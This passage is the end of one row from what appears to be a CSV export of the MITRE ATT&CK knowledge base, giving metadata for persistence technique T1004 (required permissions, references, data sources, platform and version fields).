Permissions Required: Administrator, SYSTEM","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1004', 'external_id': 'T1004'}, {'source_name': 'TechNet Autoruns', 'description': 'Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.', 'url': 'https://technet.microsoft.com/en-us/sysinternals/bb963902'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Windows Registry', 'File monitoring', 'Process monitoring']","['Administrator', 'SYSTEM']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
